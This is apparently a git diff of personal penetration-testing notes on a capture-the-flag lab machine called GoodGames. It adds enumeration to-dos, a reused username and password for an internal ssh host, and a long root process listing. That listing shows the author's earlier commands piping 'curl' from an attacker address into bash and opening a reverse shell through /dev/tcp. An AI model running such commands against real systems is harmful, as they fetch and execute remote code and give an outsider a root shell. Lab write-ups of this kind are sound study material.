@@ -12,12 +12,18 @@ _current DB user_: 'main_admin@localhost'
 _current DB user is DBA_: False
 
 ## To-Do
-[ ] Continue enumeration of inside docker.
+### Enumeration
+[_] Continue enumeration of linux host
+ - Debian GNU/Linux 11 (bullseye)
+ - Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
+
+## Done
+### Enumeration
+[x] Continue enumeration of inside docker.
  - IP address is /16
    - pingsweep 172.19.0.[1-255]; make sure to upgrade shell first, or shit will get weird.
  - augustus is mapped from host
 
-## Done
 ### Password Reuse
 [x] Determine where cracked login/password can be used
 - does this provide any additional exposure/functions/features?
@@ -82,6 +88,16 @@ Table: user
 +----+----------+--------------------+
 | 1  | admin    | superadministrator |
 +----+----------+--------------------+
+```
+
+- Host: ssh://172.17.0.1
+```
+
++----------+--------------------+
+| name     | password           |
++----------+--------------------+
+| augustus | superadministrator |
++----------+--------------------+
 ```
 
 ## Enumeration
@@ -1367,3 +1383,105 @@ We will also need the kernel version and operating system architecture. Useful i
 augustus@GoodGames:~$ uname -a
 Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
 ```
+
+Let's see what is running as root; bearing in mind that a lot of these may be from previous work/connections
+```
+augustus@GoodGames:~$ ps aux | grep root
+root         8  0.0  0.0      0     0 ?        I<   13:51   0:00 [mm_percpu_wq]
+root        12  0.0  0.0      0     0 ?        S    13:51   0:00 [migration/0]
+root        15  0.0  0.0      0     0 ?        S    13:51   0:00 [cpuhp/1]
+root        16  0.0  0.0      0     0 ?        S    13:51   0:00 [migration/1]
+root        27  0.0  0.0      0     0 ?        SN   13:51   0:00 [ksmd]
+root        28  0.0  0.0      0     0 ?        SN   13:51   0:00 [khugepaged]
+root        29  0.0  0.0      0     0 ?        I<   13:51   0:00 [crypto]
+root        30  0.0  0.0      0     0 ?        I<   13:51   0:00 [kintegrityd]
+root        34  0.0  0.0      0     0 ?        S    13:51   0:00 [watchdogd]
+root        36  0.0  0.0      0     0 ?        S    13:51   0:00 [kswapd0]
+root        55  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/24-pciehp]
+root        56  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/25-pciehp]
+root        59  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/28-pciehp]
+root        60  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/29-pciehp]
+root        63  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/32-pciehp]
+root        66  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/35-pciehp]
+root        70  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/39-pciehp]
+root        71  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/40-pciehp]
+root        74  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/43-pciehp]
+root        75  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/44-pciehp]
+root        76  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/45-pciehp]
+root        78  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/47-pciehp]
+root        79  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/48-pciehp]
+root        81  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/50-pciehp]
+root        82  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/51-pciehp]
+root        83  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/52-pciehp]
+root        84  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/53-pciehp]
+root        85  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/54-pciehp]
+root        86  0.0  0.0      0     0 ?        S    13:51   0:00 [irq/55-pciehp]
+root        87  0.0  0.0      0     0 ?        I<   13:51   0:00 [ipv6_addrconf]
+root        97  0.0  0.0      0     0 ?        I<   13:51   0:00 [kstrp]
+root       144  0.0  0.0      0     0 ?        S    13:51   0:00 [scsi_eh_0]
+root       146  0.0  0.0      0     0 ?        I<   13:51   0:00 [scsi_tmf_0]
+root       147  0.0  0.0      0     0 ?        I<   13:51   0:00 [vmw_pvscsi_wq_0]
+root       151  0.0  0.0      0     0 ?        I<   13:51   0:00 [ata_sff]
+root       153  0.0  0.0      0     0 ?        S    13:51   0:00 [scsi_eh_1]
+root       155  0.0  0.0      0     0 ?        I<   13:51   0:00 [scsi_tmf_1]
+root       157  0.0  0.0      0     0 ?        S    13:51   0:00 [scsi_eh_2]
+root       159  0.0  0.0      0     0 ?        I<   13:51   0:00 [scsi_tmf_2]
+root       160  0.0  0.0      0     0 ?        I    13:51   0:00 [kworker/u4:2-events_unbound]
+root       202  0.0  0.0      0     0 ?        I<   13:51   0:00 [kworker/0:1H-kblockd]
+root       222  0.0  0.0      0     0 ?        I    13:51   0:01 [kworker/0:2-events]
+root       278  0.0  0.0      0     0 ?        I<   13:51   0:00 [kworker/1:1H-kblockd]
+root       421  0.0  0.0      0     0 ?        S    13:52   0:00 [jbd2/sda1-8]
+root       422  0.0  0.0      0     0 ?        I<   13:52   0:00 [ext4-rsv-conver]
+root       452  0.0  0.2  22268  8232 ?        Ss   13:52   0:00 /lib/systemd/systemd-journald
+root       471  0.0  0.1  21160  4928 ?        Ss   13:52   0:00 /lib/systemd/systemd-udevd
+root       510  0.0  0.2  47816 10548 ?        Ss   13:52   0:00 /usr/bin/VGAuthService
+root       511  0.0  0.1 236988  8032 ?        Ssl  13:52   0:25 /usr/bin/vmtoolsd
+root       571  0.0  0.0      0     0 ?        I<   13:52   0:00 [ttm_swap]
+root       572  0.0  0.0      0     0 ?        S    13:52   0:00 [irq/16-vmwgfx]
+root       577  0.0  0.0      0     0 ?        I<   13:52   0:00 [nfit]
+root       590  0.0  0.0   6680  2896 ?        Ss   13:52   0:00 /usr/sbin/cron -f
+root       591  0.0  0.1 219760  4248 ?        Ssl  13:52   0:00 /usr/sbin/rsyslogd -n -iNONE
+root       592  0.0  0.1  15272  7020 ?        Ss   13:52   0:00 /lib/systemd/systemd-logind
+root       725  0.0  0.5 195416 20892 ?        Ss   13:52   0:01 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
+root       746  0.0  0.0   5780  1684 tty1     Ss+  13:52   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root       749  0.1  1.1 1344724 47672 ?       Ssl  13:52   0:29 /usr/bin/containerd
+root       847  0.0  0.1  15324  6700 ?        Ss   13:52   0:00 /usr/sbin/apache2 -k start
+root       934  0.0  2.0 1457432 82132 ?       Ssl  13:52   0:07 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root      1023  0.0  1.4 639804 57624 ?        Ssl  13:52   0:02 PM2 v5.1.2: God Daemon (/root/.pm2) 
+root      1272  0.0  0.2 1148904 11568 ?       Sl   13:52   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8085 -container-ip 172.19.0.2 -container-port 8085
+root      1285  0.0  0.3 711700 12296 ?        Sl   13:52   0:01 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 3a453ab39d3df444e9b33e4c1d9f2071827b3b7b20a8d3357b7754a84b06685f -address /run/containerd/containerd.sock
+root      1305  0.0  1.3 392556 55720 ?        Ssl  13:52   0:07 python3 project/run.py
+root      1393  0.0  0.1  12328  7256 ?        Ss   13:52   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+root      1716  0.0  0.0   4292   780 ?        S    14:47   0:00 /bin/sh -c curl 10.10.14.4:8000/revershell | bash
+root      1718  0.0  0.0  19708  3016 ?        S    14:47   0:00 bash
+root      1719  0.0  0.0  19708  3180 ?        S    14:47   0:00 bash -c bash -i >& /dev/tcp/10.10.14.4/9001 0>&1
+root      1720  0.0  0.0  19940  3656 ?        S    14:47   0:00 bash -i
+root      1925  0.0  0.2  36120  8504 ?        S    16:39   0:00 python -c import pty;pty.spawn("/bin/bash")
+root      1926  0.0  0.0  20144  3788 pts/0    Ss   16:39   0:00 /bin/bash
+root      1954  0.0  0.0  12864  1004 pts/0    S+   16:52   0:00 grep /root/scan.txt
+root      1955  0.0  0.0  12864   932 pts/0    S+   16:52   0:00 grep open
+root      1957  0.0  0.0   4292   712 ?        S    16:52   0:00 /bin/sh -c curl 10.10.14.4:8000/revershell | bash
+root      1959  0.0  0.0  19708  3172 ?        S    16:52   0:00 bash
+root      1960  0.0  0.0  19708  3196 ?        S    16:52   0:00 bash -c bash -i >& /dev/tcp/10.10.14.4/9001 0>&1
+root      1961  0.0  0.0  19940  3576 ?        S    16:52   0:00 bash -i
+root      1962  0.0  0.1  35732  8072 ?        S    16:53   0:00 python -c import pty;pty.spawn("/bin/bash")
+root      1963  0.0  0.0  19956  3600 pts/1    Ss   16:53   0:00 /bin/bash
+root      1968  0.0  0.1  45188  5288 pts/1    S+   16:54   0:00 ssh augustus@172.19.0.1
+root      1969  0.0  0.2  13080  8248 ?        Ss   16:54   0:00 sshd: augustus [priv]
+root      2086  0.0  0.0      0     0 ?        I    17:39   0:07 [kworker/1:0-mm_percpu_wq]
+root      2228  0.0  0.0      0     0 ?        Z    19:08   0:00 [ssh] <defunct>
+root      2297  0.0  0.0      0     0 ?        Z    19:13   0:00 [ssh] <defunct>
+root      2314  0.0  0.0   4292   796 ?        S    19:18   0:00 /bin/sh -c curl 10.10.14.4:8000/revershell | bash
+root      2316  0.0  0.0  19708  3152 ?        S    19:18   0:00 bash
+root      2317  0.0  0.0  19708  3180 ?        S    19:18   0:00 bash -c bash -i >& /dev/tcp/10.10.14.4/9001 0>&1
+root      2318  0.0  0.0  19940  3588 ?        S    19:18   0:00 bash -i
+root      2320  0.0  0.1  35732  7960 ?        S    19:18   0:00 python -c import pty;pty.spawn("/bin/bash")
+root      2321  0.0  0.0  19956  3616 pts/2    Ss   19:18   0:00 /bin/bash
+root      2324  0.0  0.1  45188  5324 pts/2    S+   19:19   0:00 ssh augustus@172.19.0.1
+root      2325  0.0  0.2  13084  8320 ?        Ss   19:19   0:00 sshd: augustus [priv]
+root      2347  0.0  0.0      0     0 ?        I    19:26   0:00 [kworker/u4:0-events_unbound]
+root      5577  0.0  0.0      0     0 ?        I    20:44   0:00 [kworker/1:1]
+root      5629  0.0  0.0      0     0 ?        I    21:09   0:00 [kworker/0:1-cgroup_destroy]
+augustus  5639  0.0  0.0   6176   648 pts/3    S+   21:23   0:00 grep root
+```
+
